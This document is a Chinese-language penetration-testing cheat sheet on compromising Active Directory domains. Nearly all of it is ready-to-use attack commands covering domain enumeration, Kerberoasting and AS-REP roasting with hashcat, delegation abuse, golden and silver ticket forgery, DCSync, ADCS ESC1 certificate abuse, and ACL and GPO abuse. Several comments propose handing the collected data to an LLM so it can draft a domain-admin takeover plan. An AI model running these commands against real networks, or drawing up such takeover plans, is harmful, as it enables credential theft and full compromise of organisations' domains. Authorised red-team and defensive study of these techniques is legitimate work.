## 八、AD域渗透

### 8.1 域信息收集
```bat
ipconfig /all                                   :: 主DNS后缀=域名
nslookup <domain>                               :: 与DNS同IP即域控
net time /domain                                :: 存在域则返回域控名
net view /domain                                :: 域列表
net view /domain:XXX                            :: 域内计算机
net group "domain controllers" /domain          :: 域控列表
net user /domain                                :: 域用户列表
net localgroup administrators                   :: 本地管理员组(含域账号)
wmic useraccount get /all                       :: 域用户详情
dsquery user -limit 0                           :: 全量用户
nltest /DCLIST:XXX                              :: 域控机器名
```
**高级枚举（BloodHound 数据采集）**：
```powershell
# SharpHound 采集(全量关系图)
SharpHound.exe -c All --zipfilename bh.zip
# 分析: 导入BloodHound → 查找 "Shortest Path to Domain Admins"
# AI辅助: 把SharpHound结果/cypher查询结果给LLM解释攻击路径(见13.1)
```

### 8.2 获取域控方法（攻击路径优先级）
| 方法 | 原理 | 工具 |
|------|------|------|
| DCSync | 域管/复制权限 → 拉取全域hash | mimikatz lsadump::dcsync / impacket secretsdump |
| Zerologon(CVE-2020-1472) | 重置域控机器密码 → 直接接管 | mimikatz/impacket |
| noPac(CVE-2021-42278/42287) | SAM-Account-Name混淆 → 域管票据 | noPac.py / sam-the-admin |
| Kerberoast | 服务账户SPN票证离线破解 | GetUserSPNs + hashcat -m 13100 |
| AS-REP Roasting | 无预认证用户离线破解 | GetNPUsers.py + hashcat -m 18200 |
| GPP(组策略偏好) | SYSVOL中cpassword AES可解 | gpp-decrypt |
| 委派滥用 | 无约束/约束/资源委派 | Rubeus / impacket |
| SSP截获 | 域控上注入SSP抓明文 | mimikatz misc::memssp |
| 票据投递PTT | 域管票据注入 | Rubeus ptt / mimikatz kerberos::ptt |
| Exchange ACL | 高权限组写ACL(WriteDacl) | Exchange ADSync / PrivExchange |

### 8.3 Kerberos高级攻击
```
# Kerberoasting(服务账户爆破)
python3 GetUserSPNs.py -request domain/user:pass -outputfile hash.txt
hashcat -m 13100 hash.txt wordlist.txt
# AS-REP Roasting(不需要密码)
python3 GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
# 委派滥用(约束委派→域管)
python3 findDelegation.py domain/user:pass
python3 getST.py -spn cifs/DC.domain domain/user:pass -impersonate administrator -dc-ip <DC>
python3 wmiexec.py -k -no-pass domain/<EMAIL-REDACTED>
# 黄金票据(需要krbtgt hash,伪造任意用户)
mimikatz "kerberos::golden /user:administrator /domain:xxx /sid:xxx /krbtgt:<hash> /ptt"
# 白银票据(服务票据伪造,免接触KDC)
mimikatz "kerberos::golden /user:xxx /service:cifs /target:DC /rc4:<hash> /ptt"
# 票据传递PTT
Rubeus.exe ptt /ticket:<base64>
```

### 8.4 ADCS/ACL/GPO滥用（当代主流）
```
# ADCS(证书服务) ESC1-ESC8: 配置不当CA签发高权限证书
certipy find -u user@domain -p pass -dc-ip <DC> -vulnerable
# ESC1: 用户可请求任意SAN证书 → 冒充域管
certipy req -u user@domain -p pass -ca CA-NAME -target <CA> -template ESC1 -upn administrator@domain
certipy auth -pfx admin.pfx -dc-ip <DC>
# ACL滥用: GenericAll/WriteDacl/ForceChangePassword → 提权/接管
bloodyAD -d domain -u user -p pass add genericAll user2:target
python3 dacledit.py -action write -rights GenericAll -principal user -target 'Domain Admins' domain/user:pass
# GPO滥用: 创建/修改GPO → 下发计划任务/脚本全域执行
# (需具有GPO编辑权限,SharpGPOAbuse)
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount victim --GPOName "Default Domain Policy"
# 常见错误配置: gMSA密码、SPN账户、MachineAccountQuota(默认10,可机器账户→ESC)
```

### 8.5 域内后渗透与域管定位
```
# 域管定位(找域管登录过的主机)
psloggedon.exe \\10.10.10.10 /l
# BloodHound: Shortest Path to Domain Admins / 高价值目标(备份/管理主机)
# 获取域管hash后: 全域PTH/PTT清扫 → 逐台登录拿SYSTEM → 全域拿下
# 域管hash破解优先级: krbtgt(金票) > 域管组成员 > 服务账户
# 域内敏感信息: SYSVOL脚本、共享文件、邮件、备份文件(常含明文密码)
# AI辅助: 汇总所有收集结果 → LLM生成"域管接管最短路径"作战方案
```

